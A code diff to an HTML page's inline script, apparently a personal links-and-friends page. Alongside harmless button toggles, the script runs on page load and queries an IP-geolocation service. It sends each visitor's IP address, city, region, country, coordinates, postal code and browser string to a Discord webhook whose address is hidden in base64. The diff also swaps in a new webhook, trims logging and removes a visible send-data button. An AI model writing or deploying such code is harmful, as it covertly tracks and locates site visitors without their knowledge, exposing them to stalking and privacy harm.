@@ -122,22 +122,35 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            var base64Webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3NzI5NjgyNzY3NDI2MzU3Mi9xQkZNejNZV2R0UHNOUVR5b2RDU05UVVhINnFnOHExSEd0NEFwTTZkWlpGVXR6MUY3WS1PWmFzOGFHMVRjRkRGTVE5Tw==";
+            var linksButton = document.getElementById("links-button");
+            var friendsButton = document.getElementById("friends-button");
+            var linksContainer = document.getElementById("links-container");
+            var friendsContainer = document.getElementById("friends-container");
+
+
+            var base64Webhook = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI3ODAyNzk4OTgwMzg2NDA3NC90aEUtSUMwczloazZXTGZfYXZSYk5BbmxfMXhucTg5S0JtMHc0c0M4Xzg3c2FaLW4td0NwVHJXbXo0anUwQUxwNlBPUw==";
             
+
             function decodeBase64(base64String) {
                 return decodeURIComponent(atob(base64String));
             }
 
             var webhookURL = decodeBase64(base64Webhook);
-            console.log('Decoded Webhook URL:', webhookURL);
+
+            linksButton.addEventListener("click", function () {
+                linksContainer.style.display = linksContainer.style.display === "block" ? "none" : "block";
+            });
+
+            friendsButton.addEventListener("click", function () {
+                friendsContainer.style.display = friendsContainer.style.display === "block" ? "none" : "block";
+            });
+
 
             fetch('https://ipapi.co/json/')
                 .then(response => response.json())
                 .then(data => {
                     const info = {
                         ip: data.ip,
-                        ipv4: data.ipv4, 
-                        ipv6: data.ipv6, 
                         city: data.city,
                         region: data.region,
                         country: data.country_name,
@@ -147,27 +160,25 @@
                         browser: navigator.userAgent,
                     };
 
-                    console.log('Sending data:', info); 
-
-                    return fetch(webhookURL, {
+                    fetch(webhookURL, {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json',
                         },
                         body: JSON.stringify({
-                            content: `User Info:\nIP (IPv4): ${info.ipv4}\nIP (IPv6): ${info.ipv6}\nLocation: ${info.city}, ${info.region}, ${info.country}\nLatitude: ${info.lat}\nLongitude: ${info.lon}\nPostal Code: ${info.postal}\nBrowser: ${info.browser}`
+                            content: `User Info:\nIP: ${info.ip}\nLocation: ${info.city}, ${info.region}, ${info.country}\nLatitude: ${info.lat}\nLongitude: ${info.lon}\nPostal Code: ${info.postal}\nBrowser: ${info.browser}`
                         }),
-                    });
-                })
-                .then(response => {
-                    if (response.ok) {
+                    })
+                    .then(() => {
                         console.log('Information sent successfully!');
+
                         localStorage.setItem('dataSent', 'true');
-                    } else {
-                        console.error('Failed to send information:', response.statusText);
-                    }
-                })
-                .catch(err => console.error('Error:', err));
+                    })
+                    .catch(err => console.error('Error:', err));
+                });
+
+
+            document.getElementById('send-data-button')?.remove();
         });
     </script>
 </body>
